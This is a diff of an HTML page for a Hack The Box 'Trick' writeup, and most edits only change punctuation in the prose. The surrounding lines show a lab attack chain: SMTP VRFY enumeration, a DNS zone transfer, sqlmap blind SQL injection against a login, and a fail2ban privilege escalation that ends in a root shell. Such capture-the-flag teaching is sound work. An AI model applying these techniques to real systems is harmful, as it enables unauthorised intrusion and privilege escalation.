@@ -53,7 +53,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-trick/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -219,7 +219,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Coming Soon - Start Bootstrap Theme
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Four ports. Port 80 is a &ldquo;coming soon&rdquo; placeholder. Port 53 is BIND, which is notable - a DNS server running on a box like this usually means there are zones to enumerate. Port 25 is SMTP but didn&rsquo;t respond to connection. I checked SMTP first to see if VRFY enumeration would work:</p>
+</span></span></code></pre></div><p>Four ports. Port 80 is a &ldquo;coming soon&rdquo; placeholder. Port 53 is BIND, which is notable. A DNS server running on a box like this usually means there are zones to enumerate. Port 25 is SMTP but didn&rsquo;t respond to connection. I checked SMTP first to see if VRFY enumeration would work:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">VRFY root
 </span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 root
 </span></span><span class="line"><span class="cl">VRFY admin
@@ -229,7 +229,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">VRFY www-data
 </span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 www-data
 </span></span></code></pre></div><p><code>root</code> and <code>www-data</code> exist. Useful context, but no direct attack path from here.</p>
-<p>Vhost fuzzing on port 80 found nothing useful. Port 53 is the more interesting angle. DNS servers that are misconfigured to allow zone transfers will hand you the complete DNS record set for a zone - every hostname, every subdomain - in a single query. <code>dig axfr</code> sends a zone transfer request:</p>
+<p>Vhost fuzzing on port 80 found nothing useful. Port 53 is the more interesting angle. DNS servers that are misconfigured to allow zone transfers will hand you the complete DNS record set for a zone, every hostname, every subdomain, in a single query. <code>dig axfr</code> sends a zone transfer request:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ dig axfr @<span class="nv">$DC</span> trick.htb
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.20.23 &lt;&lt;&gt;&gt; axfr @10.129.227.180 trick.htb
@@ -249,7 +249,7 @@ stroke-linejoin="round" class="feather feather-home">
 <h2 id="payroll-sqli">Payroll SQLi</h2>
 <p>Added it to <code>/etc/hosts</code> and opened it:</p>
 <p><img src="/images/writeups/htb-trick/web-preprod-payroll-login.png" alt="preprod-payroll.trick.htb login page with username and password fields"></p>
-<p>A login form. Time-based blind SQL injection is the type where the database pauses execution for a set number of seconds when the condition is true - the attacker infers data character by character from whether the response is delayed. It&rsquo;s slow but reliable when error-based injection is suppressed. I saved the login request from Burp and pointed sqlmap at it:</p>
+<p>A login form. Time-based blind SQL injection is the type where the database pauses execution for a set number of seconds when the condition is true. The attacker infers data character by character from whether the response is delayed. It&rsquo;s slow but reliable when error-based injection is suppressed. I saved the login request from Burp and pointed sqlmap at it:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sqlmap -r login_req 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>11:03:11<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;login_req&#39;</span>
@@ -335,7 +335,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/fail2ban restart
 </span></span></code></pre></div><p>Two things: member of <code>security</code> group, and can restart fail2ban as root without a password. Let me explain why that&rsquo;s exploitable.</p>
 <p><em>Reference: <a href="https://juggernaut-sec.com/fail2ban-lpe/">juggernaut-sec.com/fail2ban-lpe</a></em></p>
-<p>fail2ban monitors log files for brute-force patterns and responds by executing a configured <em>action</em> - typically an iptables rule to block the offending IP. Those actions are shell commands defined in config files under <code>/etc/fail2ban/action.d/</code>. When fail2ban is restarted it re-reads all config from disk. The <code>security</code> group controls the <code>action.d/</code> directory:</p>
+<p>fail2ban monitors log files for brute-force patterns and responds by executing a configured <em>action</em>, typically an iptables rule to block the offending IP. Those actions are shell commands defined in config files under <code>/etc/fail2ban/action.d/</code>. When fail2ban is restarted it re-reads all config from disk. The <code>security</code> group controls the <code>action.d/</code> directory:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ ls -la /etc/fail2ban/
 </span></span><span class="line"><span class="cl">total <span class="m">76</span>
 </span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">6</span> root root      <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 .
@@ -362,7 +362,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">michael@trick:~$ grep <span class="s2">&#34;banaction&#34;</span> /etc/fail2ban/jail.conf <span class="p">|</span> head -5
 </span></span><span class="line"><span class="cl"><span class="nv">banaction</span> <span class="o">=</span> iptables-multiport
 </span></span><span class="line"><span class="cl"><span class="nv">banaction_allports</span> <span class="o">=</span> iptables-allports
-</span></span></code></pre></div><p><code>bantime = 10s</code> and <code>banaction = iptables-multiport</code>. The <code>iptables-multiport.conf</code> action file is what gets executed when fail2ban decides to ban an IP. The <code>actionban</code> directive in that file is the shell command that runs - as root, because fail2ban runs as root.</p>
+</span></span></code></pre></div><p><code>bantime = 10s</code> and <code>banaction = iptables-multiport</code>. The <code>iptables-multiport.conf</code> action file is what gets executed when fail2ban decides to ban an IP. The <code>actionban</code> directive in that file is the shell command that runs, as root, because fail2ban runs as root.</p>
 <p>The exploit:</p>
 <ol>
 <li>Delete <code>iptables-multiport.conf</code> from <code>action.d/</code> (allowed because we can write to the directory)</li>
@@ -399,7 +399,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">root
 </span></span><span class="line"><span class="cl">kanyo-5.0# <span class="nb">cd</span> /root
 </span></span></code></pre></div><p>Root flag.</p>
-<p>The fail2ban abuse is one of those privescs that feels inevitable once you see the setup. Write access to action configs plus a NOPASSWD service restart is a complete chain: you control what runs as root and you control when it runs. The 10-second ban time is tight but hydra hammers fast enough that it trips the threshold. Worth keeping in mind any time you see a user in a group with names like <code>security</code>, <code>monitoring</code>, or <code>log</code> - those often have write access to config files that feed into services running as root.</p>
+<p>The fail2ban abuse is one of those privescs that feels inevitable once you see the setup. Write access to action configs plus a NOPASSWD service restart is a complete chain: you control what runs as root and you control when it runs. The 10-second ban time is tight but hydra hammers fast enough that it trips the threshold. Worth keeping in mind any time you see a user in a group with names like <code>security</code>, <code>monitoring</code>, or <code>log</code>. Those often have write access to config files that feed into services running as root.</p>
 
             </div>
         </article></main>
@@ -524,6 +524,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
